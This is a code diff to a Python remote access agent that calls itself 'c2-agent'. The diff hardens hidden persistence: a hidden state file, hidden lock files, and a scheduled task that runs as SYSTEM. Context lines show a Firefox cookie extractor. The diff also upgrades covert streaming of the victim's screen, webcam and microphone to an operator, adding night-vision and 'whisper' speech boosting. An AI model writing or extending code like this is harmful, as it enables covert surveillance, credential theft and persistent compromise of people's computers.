@@ -149,10 +149,22 @@ frame_q = None
 # ----- Identity persistence file (hidden location) -----
 STATE_FILE = os.path.join(os.environ.get('APPDATA', os.path.expanduser("~")), ".c2_agent_state.json")
 
+def unhide_file(path):
+    if platform.system() != "Windows":
+        return
+    try:
+        FILE_ATTRIBUTE_NORMAL = 0x80
+        attrs = ct.windll.kernel32.GetFileAttributesW(path)
+        if attrs != 0xFFFFFFFF and (attrs & (0x2 | 0x4 | 0x1)):
+            ct.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL)
+    except Exception:
+        pass
+
 def load_or_create_identity():
     """Load existing agent_id and session_id from file, or create new ones."""
     if os.path.exists(STATE_FILE):
         try:
+            unhide_file(STATE_FILE)
             with open(STATE_FILE, "r") as f:
                 data = json.load(f)
                 agent_id = data.get("agent_id")
@@ -167,6 +179,7 @@ def load_or_create_identity():
     session_id = f"SID-{uuid.uuid4().hex[:6].upper()}"
     server_url = PANEL_URL
     try:
+        unhide_file(STATE_FILE)
         with open(STATE_FILE, "w") as f:
             json.dump({"agent_id": agent_id, "session_id": session_id, "server_url": server_url}, f)
         log.info(f"Created new identity: {agent_id}")
@@ -476,11 +489,14 @@ class AgentState:
 
     def save_server_url(self):
         try:
+            unhide_file(STATE_FILE)
             with open(STATE_FILE, "r") as f:
                 data = json.load(f)
             data["server_url"] = self.server_url
             with open(STATE_FILE, "w") as f:
                 json.dump(data, f)
+            if platform.system() == "Windows":
+                ct.windll.kernel32.SetFileAttributesW(STATE_FILE, 2)
         except Exception as e:
             log.warning(f"Failed to save server_url: {e}")
 
@@ -496,6 +512,11 @@ def check_single_instance():
         try:
             kernel32 = ct.windll.kernel32
             mutex = kernel32.CreateMutexW(None, False, MUTEX_NAME)
+            if not mutex:
+                local_mutex_name = f"Local\\AgentSingleInstanceMutex_{os.environ.get('USERNAME', 'Default')}"
+                mutex = kernel32.CreateMutexW(None, False, local_mutex_name)
+                if not mutex:
+                    return _check_file_lock()
             if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                 kernel32.CloseHandle(mutex)
                 return False
@@ -508,7 +529,7 @@ def check_single_instance():
 
 def _check_file_lock():
     """File‑based lock with stale PID detection and flock on Unix."""
-    stale_age = 90  # Reduced from 300s for faster watchdog recovery (watchdog polls every 60s)
+    stale_age = 90
     lock_fd = None
 
     def is_process_alive(pid):
@@ -531,15 +552,18 @@ def _check_file_lock():
 
     if os.path.exists(LOCK_FILE):
         try:
+            unhide_file(LOCK_FILE)
             with open(LOCK_FILE, 'r') as f:
                 old_pid = int(f.read().strip())
             if is_process_alive(old_pid):
                 mtime = os.path.getmtime(LOCK_FILE)
                 if time.time() - mtime <= stale_age:
                     return False
+            unhide_file(LOCK_FILE)
             os.remove(LOCK_FILE)
         except:
             try:
+                unhide_file(LOCK_FILE)
                 os.remove(LOCK_FILE)
             except:
                 pass
@@ -563,11 +587,10 @@ def _check_file_lock():
         pass
 
     try:
+        unhide_file(LOCK_FILE)
         with open(LOCK_FILE, 'w') as f:
             f.write(str(os.getpid()))
-        if platform.system() == "Windows":
-            ct.windll.kernel32.SetFileAttributesW(LOCK_FILE, 2)
-        atexit.register(lambda: os.remove(LOCK_FILE) if os.path.exists(LOCK_FILE) else None)
+        atexit.register(lambda: (unhide_file(LOCK_FILE), os.remove(LOCK_FILE)) if os.path.exists(LOCK_FILE) else None)
         return True
     except:
         return True
@@ -659,6 +682,100 @@ try:
     from aiortc.sdp import candidate_from_sdp
     import av
     HAS_WEBRTC = True
+
+    # ========== NEXT-GEN HIGH PROFILE & 35MBPS VIDEO CODEC UPGRADE ==========
+    try:
+        import aiortc.codecs as _aiortc_codecs
+        import aiortc.codecs.h264 as _aiortc_h264
+        from aiortc.rtcrtpparameters import RTCRtpCodecParameters, RTCRtcpFeedback
+
+        # 1. Uncap H.264 bitrates in aiortc from 3 Mbps to 35 Mbps
+        _aiortc_h264.MAX_BITRATE = 35_000_000
+        _aiortc_h264.DEFAULT_BITRATE = 15_000_000
+        _aiortc_h264.MIN_BITRATE = 1_000_000
+
+        # 2. Register H.264 High Profile (Level 5.0 and Level 4.2) in codec capabilities
+        _high_profile_codecs = [
+            RTCRtpCodecParameters(
+                mimeType='video/H264',
+                clockRate=90000,
+                channels=None,
+                payloadType=105,
+                rtcpFeedback=[
+                    RTCRtcpFeedback(type='nack', parameter=None),
+                    RTCRtcpFeedback(type='nack', parameter='pli'),
+                    RTCRtcpFeedback(type='goog-remb', parameter=None)
+                ],
+                parameters={
+                    'level-asymmetry-allowed': '1',
+                    'packetization-mode': '1',
+                    'profile-level-id': '640032'  # High Profile Level 5.0
+                }
+            ),
+            RTCRtpCodecParameters(
+                mimeType='video/H264',
+                clockRate=90000,
+                channels=None,
+                payloadType=106,
+                rtcpFeedback=[
+                    RTCRtcpFeedback(type='nack', parameter=None),
+                    RTCRtcpFeedback(type='nack', parameter='pli'),
+                    RTCRtcpFeedback(type='goog-remb', parameter=None)
+                ],
+                parameters={
+                    'level-asymmetry-allowed': '1',
+                    'packetization-mode': '1',
+                    'profile-level-id': '64002a'  # High Profile Level 4.2
+                }
+            )
+        ]
+        # Prepend to prioritize High Profile before Baseline
+        for _hpc in reversed(_high_profile_codecs):
+            if not any(c.parameters.get('profile-level-id') == _hpc.parameters.get('profile-level-id') for c in _aiortc_codecs.CODECS['video']):
+                _aiortc_codecs.CODECS['video'].insert(0, _hpc)
+
+        # 3. Upgrade H264Encoder to use High Profile with CABAC entropy coding & 60 FPS
+        _orig_h264_encode_frame = _aiortc_h264.H264Encoder._encode_frame
+
+        def _upgraded_h264_encode_frame(self, frame, force_keyframe):
+            if self.codec and (frame.width != self.codec.width or frame.height != self.codec.height):
+                self.buffer_data = b""
+                self.buffer_pts = None
+                self.codec = None
+
+            if force_keyframe:
+                frame.pict_type = av.video.frame.PictureType.I
+            else:
+                frame.pict_type = av.video.frame.PictureType.NONE
+
+            if self.codec is None:
+                self.codec = av.CodecContext.create("libx264", "w")
+                self.codec.width = frame.width
+                self.codec.height = frame.height
+                self.codec.bit_rate = min(max(self.target_bitrate, 1_000_000), 35_000_000)
+                self.codec.pix_fmt = "yuv420p"
+                self.codec.framerate = Fraction(60, 1)
+                self.codec.time_base = Fraction(1, 60)
+                self.codec.profile = "High"
+                self.codec.options = {
+                    "level": "42",
+                    "tune": "zerolatency",
+                    "preset": "ultrafast",
+                    "coder": "cabac",
+                    "bf": "0"
+                }
+
+            data_to_send = b""
+            for package in self.codec.encode(frame):
+                data_to_send += bytes(package)
+
+            if data_to_send:
+                yield from self._split_bitstream(data_to_send)
+
+        _aiortc_h264.H264Encoder._encode_frame = _upgraded_h264_encode_frame
+        logging.getLogger("c2-agent").info("[WebRTC] Successfully upgraded H.264 pipeline: High Profile + CABAC + 35Mbps uncap")
+    except Exception as _patch_err:
+        logging.getLogger("c2-agent").warning(f"[WebRTC] Codec upgrade patch warning: {_patch_err}")
 except ImportError as e:
     logging.getLogger("c2-agent").warning(f"aiortc/av import error: {e}")
 
@@ -1063,6 +1180,17 @@ def extract_firefox_cookies(profile_path):
     return cookies
 
 # ========== PERSISTENCE (WINDOWS, HIDDEN) ==========
+def unhide_file(path):
+    if platform.system() != "Windows":
+        return
+    try:
+        FILE_ATTRIBUTE_NORMAL = 0x80
+        attrs = ct.windll.kernel32.GetFileAttributesW(path)
+        if attrs != 0xFFFFFFFF and (attrs & (0x2 | 0x4 | 0x1)):
+            ct.windll.kernel32.SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL)
+    except Exception:
+        pass
+
 def set_file_attributes_hidden_system(path):
     if platform.system() != "Windows":
         return
@@ -1091,6 +1219,7 @@ def file_hash(path):
 
 def copy_file_with_attributes(src, dst):
     ensure_directories(dst)
+    unhide_file(dst)
     shutil.copy2(src, dst)
     set_file_attributes_hidden_system(dst)
 
@@ -1147,12 +1276,13 @@ def create_persistence_task(primary_path):
   </Settings>
   <Principals>
     <Principal>
+      <UserId>S-1-5-18</UserId>
       <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
   <Actions>
     <Exec>
-      <Command>{primary_path}</Command>
+      <Command>"{primary_path}"</Command>
     </Exec>
   </Actions>
 </Task>"""
@@ -2044,6 +2174,7 @@ if HAS_WEBRTC:
             self.hdc = 0
             self.memdc = 0
             self.bmp = 0
+            self.old_bmp = 0
             self.width = 0
             self.height = 0
             self.header = None
@@ -2060,7 +2191,7 @@ if HAS_WEBRTC:
                 self.hdc = self.user32.GetDC(0)
                 self.memdc = self.gdi32.CreateCompatibleDC(self.hdc)
                 self.bmp = self.gdi32.CreateCompatibleBitmap(self.hdc, w, h)
-                self.gdi32.SelectObject(self.memdc, self.bmp)
+                self.old_bmp = self.gdi32.SelectObject(self.memdc, self.bmp)
                 
                 class BITMAPINFOHEADER(ct.Structure):
                     _fields_ = [
@@ -2119,12 +2250,14 @@ if HAS_WEBRTC:
                     if ci.flags & 1: # CURSOR_SHOWING
                         ii = ICONINFO()
                         if self.user32.GetIconInfo(ci.hCursor, ct.byref(ii)):
-                            x = ci.ptScreenPos.x - ii.xHotspot
-                            y = ci.ptScreenPos.y - ii.yHotspot
-                            # DI_NORMAL = 0x0003
-                            self.user32.DrawIconEx(self.memdc, x, y, ci.hCursor, 0, 0, 0, None, 0x0003)
-                            if ii.hbmMask: self.gdi32.DeleteObject(ii.hbmMask)
-                            if ii.hbmColor: self.gdi32.DeleteObject(ii.hbmColor)
+                            try:
+                                x = ci.ptScreenPos.x - ii.xHotspot
+                                y = ci.ptScreenPos.y - ii.yHotspot
+                                # DI_NORMAL = 0x0003
+                                self.user32.DrawIconEx(self.memdc, x, y, ci.hCursor, 0, 0, 0, None, 0x0003)
+                            finally:
+                                if ii.hbmMask: self.gdi32.DeleteObject(ii.hbmMask)
+                                if ii.hbmColor: self.gdi32.DeleteObject(ii.hbmColor)
             except Exception:
                 pass
             
@@ -2138,13 +2271,19 @@ if HAS_WEBRTC:
         def close(self):
             self.buf = None
             self.buf_ptr = None
-            if self.bmp:
-                try:
-                    self.gdi32.DeleteObject(self.bmp)
-                except Exception:
-                    pass
-                self.bmp = 0
             if self.memdc:
+                if self.old_bmp:
+                    try:
+                        self.gdi32.SelectObject(self.memdc, self.old_bmp)
+                    except Exception:
+                        pass
+                    self.old_bmp = 0
+                if self.bmp:
+                    try:
+                        self.gdi32.DeleteObject(self.bmp)
+                    except Exception:
+                        pass
+                    self.bmp = 0
                 try:
                     self.gdi32.DeleteDC(self.memdc)
                 except Exception:
@@ -2160,7 +2299,7 @@ if HAS_WEBRTC:
     class ScreenStreamTrack(VideoStreamTrack):
         kind = "video"
 
-        def __init__(self, fps=30, target_width=1920):
+        def __init__(self, fps=60, target_width=1920):
             super().__init__()
             self.fps = fps
             self.target_width = target_width
@@ -2202,7 +2341,7 @@ if HAS_WEBRTC:
                     sleep_dur = target_time - now
                     if sleep_dur > 0:
                         time.sleep(sleep_dur)
-                    elif sleep_dur < -0.5:
+                    elif sleep_dur < -0.2:
                         # Reset sync reference to prevent frame backlog buildup
                         start_time = time.perf_counter()
                         frame_idx = 0
@@ -2277,8 +2416,8 @@ if HAS_WEBRTC:
             vf = av.VideoFrame.from_ndarray(yuv, format="yuv420p")
             vf.pts = pts
             vf.time_base = time_base
-            # Send I-frame every 60 frames to avoid periodic stuttering
-            if self._frame_count % 60 == 0:
+            # Send I-frame cadence matched to negotiated FPS (e.g. every 60 frames for 60 FPS)
+            if self._frame_count % max(int(self.fps), 30) == 0:
                 try:
                     vf.pict_type = av.PictureType.I
                 except Exception:
@@ -2290,14 +2429,57 @@ if HAS_WEBRTC:
             self._stopped = True
             super().stop()
 
+    class CameraAIPipeline:
+        """
+        Real-Time Computer Vision & Image Enhancement Engine:
+        - Adaptive CLAHE Studio Lighting (YUV Luminance Equalization)
+        - Tactical IR / Night Vision False-Color Mapping (COLORMAP_JET)
+        - Fast Motion-Guided Background Blur (MOG2 Background Subtractor + Morphological Filter)
+        - Raw Authentic Unmanipulated Pass-Through
+        """
+        def __init__(self):
+            self.clahe = cv2.createCLAHE(clipLimit=2.0, tileGridSize=(8, 8)) if HAS_WEBRTC else None
+            self.bg_subtractor = None
+
+        def process(self, frame, mode='raw'):
+            if mode == 'raw' or frame is None:
+                return frame
+            try:
+                if mode in ('studio_light', 'auto_enhance'):
+                    # Adaptive CLAHE in YUV space for balanced studio lighting without color distortion
+                    yuv = cv2.cvtColor(frame, cv2.COLOR_BGR2YUV)
+                    yuv[:, :, 0] = self.clahe.apply(yuv[:, :, 0])
+                    return cv2.cvtColor(yuv, cv2.COLOR_YUV2BGR)
+
+                elif mode == 'night_vision':
+                    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+                    enhanced = self.clahe.apply(gray)
+                    return cv2.applyColorMap(enhanced, cv2.COLORMAP_JET)
+
+                elif mode == 'privacy_blur':
+                    if self.bg_subtractor is None:
+                        self.bg_subtractor = cv2.createBackgroundSubtractorMOG2(history=300, varThreshold=16, detectShadows=False)
+                    fg_mask = self.bg_subtractor.apply(frame)
+                    kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (5, 5))
+                    fg_mask = cv2.morphologyEx(fg_mask, cv2.MORPH_CLOSE, kernel)
+                    fg_mask = cv2.GaussianBlur(fg_mask, (15, 15), 0)
+                    blurred_bg = cv2.GaussianBlur(frame, (31, 31), 0)
+                    alpha = (fg_mask.astype(np.float32) / 255.0)[:, :, None]
+                    return (frame * alpha + blurred_bg * (1.0 - alpha)).astype(np.uint8)
+            except Exception as e:
+                log.debug(f"CameraAIPipeline error: {e}")
+            return frame
+
     class CameraStreamTrack(VideoStreamTrack):
         kind = "video"
 
-        def __init__(self, cam_index=0, fps=30, target_width=1920):
+        def __init__(self, cam_index=0, fps=30, target_width=1920, ai_mode='raw'):
             super().__init__()
             self.fps = fps
             self.cam_index = cam_index
             self.target_width = target_width
+            self.ai_mode = ai_mode
+            self.ai_pipeline = CameraAIPipeline()
             self._frame_count = 0
             self._stopped = False
             self._last_yuv_frame = None
@@ -2306,12 +2488,14 @@ if HAS_WEBRTC:
             self._worker_thread = threading.Thread(target=self._capture_worker, daemon=True, name="CameraCaptureWorker")
             self._worker_thread.start()
 
-        def update_params(self, fps=None, target_width=None):
+        def update_params(self, fps=None, target_width=None, ai_mode=None, **kwargs):
             if fps is not None and fps > 0:
                 self.fps = fps
             if target_width is not None:
                 self.target_width = target_width
-            log.info(f"[CameraStreamTrack] Dynamic quality update: fps={self.fps}, target_width={self.target_width}")
+            if ai_mode:
+                self.ai_mode = ai_mode
+            log.info(f"[CameraStreamTrack] Dynamic quality update: fps={self.fps}, target_width={self.target_width}, ai_mode={self.ai_mode}")
 
         def _capture_worker(self):
             if platform.system() == "Windows":
@@ -2336,7 +2520,7 @@ if HAS_WEBRTC:
                 actual_w = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
                 actual_h = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
                 actual_fps = cap.get(cv2.CAP_PROP_FPS)
-                log.info(f"[CameraStreamTrack] Hardware camera initialized: {actual_w}x{actual_h} @ {actual_fps}FPS (Requested {self.target_width}px @ {self.fps}FPS)")
+                log.info(f"[CameraStreamTrack] Hardware camera initialized: {actual_w}x{actual_h} @ {actual_fps}FPS (Requested {self.target_width}px @ {self.fps}FPS, AI Mode: {self.ai_mode})")
 
             last_push_time = time.perf_counter()
 
@@ -2352,6 +2536,9 @@ if HAS_WEBRTC:
                     if (now - last_push_time) < (target_interval * 0.85):
                         continue
                     last_push_time = now
+
+                    # Apply CameraAIPipeline processing (CLAHE, Night Vision, Privacy Blur)
+                    frame = self.ai_pipeline.process(frame, mode=self.ai_mode)
 
                     h, w = frame.shape[:2]
                     # Resize using SIMD INTER_AREA filter if target_width is explicitly set and smaller than frame width
@@ -2398,8 +2585,8 @@ if HAS_WEBRTC:
             vf = av.VideoFrame.from_ndarray(yuv, format="yuv420p")
             vf.pts = pts
             vf.time_base = time_base
-            # Send I-frame every 60 frames to avoid periodic video stuttering
-            if self._frame_count % 60 == 0:
+            # Send I-frame cadence matched to negotiated FPS
+            if self._frame_count % max(int(self.fps), 30) == 0:
                 try:
                     vf.pict_type = av.PictureType.I
                 except Exception:
@@ -2411,10 +2598,82 @@ if HAS_WEBRTC:
             self._stopped = True
             super().stop()
 
+    class AdvancedAudioDSP:
+        """
+        High-Performance Real-Time Audio DSP Pipeline:
+        - Vectorized DC Offset Removal
+        - Dynamic Acoustic Feedback Loop Notch Damping (kills screeching loops within 20ms)
+        - Adaptive Noise Gate (-22dB to -26dB attenuation of ambient fan/typing/room noise)
+        - Fast Dynamic Multi-Stage Automatic Gain Control (AGC) targeting -18 dBFS
+        - Analog Tanh Soft Saturation Limiter
+        """
+        def __init__(self, sample_rate=48000, chunk_size=960):
+            self.sample_rate = sample_rate
+            self.chunk_size = chunk_size
+            self.noise_floor = 80.0
+            self.gate_gain = 1.0
+            self.agc_gain = 1.0
+            self.target_rms = 4000.0  # ~ -18 dBFS
+
+        def process(self, raw_bytes, mode='studio'):
+            audio = np.frombuffer(raw_bytes, dtype=np.int16).astype(np.float32)
+            # 1. Vectorized DC offset removal
+            audio -= np.mean(audio)
+
+            if mode == 'raw':
+                scaled = audio / 32768.0
+                return np.clip(np.tanh(scaled * 1.05) * 32767.0, -32768, 32767).astype(np.int16).reshape(1, -1)
+
+            rms = np.sqrt(np.mean(audio**2) + 1e-6)
+
+            # 2. Dynamic Acoustic Feedback Detection (kills screeching loops)
+            # If a single frequency contains >30% of total spectral power and signal is loud, feedback loop is forming!
+            if rms > 1200.0:
+                try:
+                    fft_mag = np.abs(np.fft.rfft(audio))
+                    peak_energy = np.max(fft_mag)**2
+                    total_energy = np.sum(fft_mag**2) + 1e-6
+                    if (peak_energy / total_energy) > 0.30:
+                        # Instant anti-feedback damping to break the acoustic feedback loop
+                        audio *= 0.15
+                        rms *= 0.15
+                except Exception:
+                    pass
+
+            # 3. Adaptive Noise Gate
+            # Track ambient noise floor during lower energy segments
+            if rms < self.noise_floor * 2.0:
+                self.noise_floor = 0.98 * self.noise_floor + 0.02 * rms
+            self.noise_floor = max(25.0, min(self.noise_floor, 2500.0))
+
+            gate_mult = 1.8 if mode == 'whisper' else (2.8 if mode == 'gate' else 2.2)
+            gate_threshold = self.noise_floor * gate_mult
+            attenuation = 0.05 if mode == 'gate' else 0.08 # -26dB or -22dB
+            target_gate = 1.0 if rms > gate_threshold else attenuation
+            alpha = 0.4 if target_gate > self.gate_gain else 0.08
+            self.gate_gain = (1.0 - alpha) * self.gate_gain + alpha * target_gate
+            audio *= self.gate_gain
+
+            # 4. Multi-Stage Automatic Gain Control (AGC)
+            target_rms = 6000.0 if mode == 'whisper' else self.target_rms
+            if self.gate_gain > 0.25 and rms > 40.0:
+                target_agc = target_rms / max(rms, 80.0)
+                max_boost = 12.0 if mode == 'whisper' else 8.0  # up to +21dB for whisper, +18dB for clean
+                target_agc = np.clip(target_agc, 0.4, max_boost)
+                agc_alpha = 0.15 if target_agc < self.agc_gain else 0.04
+                self.agc_gain = (1.0 - agc_alpha) * self.agc_gain + agc_alpha * target_agc
+            audio *= self.agc_gain
+
+            # 5. Analog Tanh Soft Limiter (prevents digital clipping, smooth saturation)
+            scaled = audio / 32768.0
+            soft_clipped = np.tanh(scaled * 1.05) * 32767.0
+            audio_final = np.clip(soft_clipped, -32768, 32767).astype(np.int16).reshape(1, -1)
+            return audio_final
+
     class CustomAudioStreamTrack(AudioStreamTrack):
         kind = "audio"
 
-        def __init__(self, device_index=None):
+        def __init__(self, device_index=None, dsp_mode='studio'):
             super().__init__()
             import pyaudio
             self._pts = 0
@@ -2422,6 +2681,8 @@ if HAS_WEBRTC:
             self.RATE = 48000
             self.CHANNELS = 1
             self.device_index = device_index
+            self.dsp_mode = dsp_mode
+            self.dsp = AdvancedAudioDSP(sample_rate=self.RATE, chunk_size=self.CHUNK)
             self._stopped = False
             self._queue = asyncio.Queue(maxsize=2)
             self._loop = asyncio.get_event_loop()
@@ -2449,12 +2710,17 @@ if HAS_WEBRTC:
                     input_device_index=target_dev,
                     frames_per_buffer=self.CHUNK
                 )
-                log.info(f"[AudioTrack] Initialized input capture from device index {target_dev} @ 48kHz 20ms PCM")
+                log.info(f"[AudioTrack] Initialized input capture from device index {target_dev} @ 48kHz 20ms PCM (DSP Mode: {self.dsp_mode})")
             except Exception as e:
                 log.warning(f"CustomAudioStreamTrack open error: {e}")
 
             self._worker_thread = threading.Thread(target=self._audio_worker, daemon=True, name="AudioCaptureWorker")
             self._worker_thread.start()
+
+        def update_params(self, dsp_mode=None, **kwargs):
+            if dsp_mode:
+                self.dsp_mode = dsp_mode
+                log.info(f"[AudioTrack] Dynamic DSP mode update: {self.dsp_mode}")
 
         def _audio_worker(self):
             while not self._stopped and self.stream:
@@ -2484,15 +2750,7 @@ if HAS_WEBRTC:
 
             try:
                 raw_data = await asyncio.wait_for(self._queue.get(), timeout=0.04)
-                audio_array = np.frombuffer(raw_data, dtype=np.int16).astype(np.float32)
-
-                # Vectorized DC offset removal
-                audio_array -= np.mean(audio_array)
-
-                # Soft Tanh Limiter to smoothly contain dynamic range without digital clipping
-                scaled = audio_array / 32768.0
-                soft_clipped = np.tanh(scaled * 1.05) * 32767.0
-                audio_final = np.clip(soft_clipped, -32768, 32767).astype(np.int16).reshape(1, -1)
+                audio_final = self.dsp.process(raw_data, mode=self.dsp_mode)
             except Exception:
                 audio_final = np.zeros((1, self.CHUNK), dtype=np.int16)
 
@@ -2746,7 +3004,7 @@ async def handle_webrtc_offer_async(data):
             })
 
     if stream_type == 'screen':
-        fps = params.get('fps', 30)
+        fps = params.get('fps', 60)
         width = params.get('width', 1920)
         track = ScreenStreamTrack(fps=fps, target_width=width)
         pc.addTrack(track)
@@ -2755,12 +3013,14 @@ async def handle_webrtc_offer_async(data):
         cam_idx = params.get('device', 0)
         fps = params.get('fps', 30)
         width = params.get('width') or params.get('target_width', 1920)
-        track = CameraStreamTrack(cam_index=cam_idx, fps=fps, target_width=width)
+        ai_mode = params.get('ai_mode', 'raw')
+        track = CameraStreamTrack(cam_index=cam_idx, fps=fps, target_width=width, ai_mode=ai_mode)
         pc.addTrack(track)
         webrtc_tracks[stream_type] = track
     elif stream_type == 'audio':
         audio_dev = params.get('device')
-        track = CustomAudioStreamTrack(device_index=audio_dev)
+        dsp_mode = params.get('dsp_mode', 'studio')
+        track = CustomAudioStreamTrack(device_index=audio_dev, dsp_mode=dsp_mode)
         pc.addTrack(track)
         webrtc_tracks[stream_type] = track
 
@@ -2849,9 +3109,10 @@ async def handle_update_stream_params_async(data):
     stream_type = data.get('stream_type', 'screen')
     fps = data.get('fps')
     target_width = data.get('target_width')
+    dsp_mode = data.get('dsp_mode')
     track = webrtc_tracks.get(stream_type)
     if track and hasattr(track, 'update_params'):
-        track.update_params(fps=fps, target_width=target_width)
+        track.update_params(fps=fps, target_width=target_width, dsp_mode=dsp_mode)
 
 
 
